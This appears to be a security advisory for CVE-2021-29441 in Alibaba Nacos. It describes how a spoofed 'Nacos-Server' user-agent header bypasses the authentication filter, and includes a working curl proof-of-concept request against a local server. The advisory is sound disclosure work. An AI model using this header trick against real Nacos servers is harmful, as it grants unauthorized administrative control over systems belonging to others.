# [H] Authentication Bypass

## Summary
Severity: High
Advisory: GHSA-36hp-jr8h-556f
CVE: CVE-2021-29441
CWE: CWE-290
Ecosystem: Maven
Published: 2021-04-27
Source: https://github.com/advisories/GHSA-36hp-jr8h-556f
Type: github-advisory

## Affected
- Maven: `com.alibaba.nacos:nacos-common` — affected >=0 <1.4.1

## Details
When configured to use authentication (`-Dnacos.core.auth.enabled=true`) Nacos uses the `AuthFilter` servlet filter to enforce authentication. This filter has a [backdoor](https://github.com/alibaba/nacos/blob/5fa05aef52f7432aeab19fe53035431b9d8c91d9/core/src/main/java/com/alibaba/nacos/core/auth/AuthFilter.java#L78-L81) that enables Nacos servers to bypass this filter and therefore skip authentication checks. This mechanism relies on the `user-agent` HTTP header so it can be easily spoofed.

The following request to the `configuration` endpoint gets rejected as we are not providing any credentials:
```
❯ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld"
{"timestamp":"2020-12-02T14:33:57.154+0000","status":403,"error":"Forbidden","message":"unknown user!","path":"/nacos/v1/cs/configs"}                                                                                                       
```

However the following one gets accepted by using the `Nacos-Server` user-agent header:
```
❯ curl -X POST -A Nacos-Server "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld"
true 
```

#### Impact

This issue may allow any user to carry out any administrative tasks on the Nacos server.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-29441
- https://github.com/alibaba/nacos/issues/4701
- https://github.com/alibaba/nacos/pull/4703
- https://github.com/advisories/GHSA-36hp-jr8h-556f
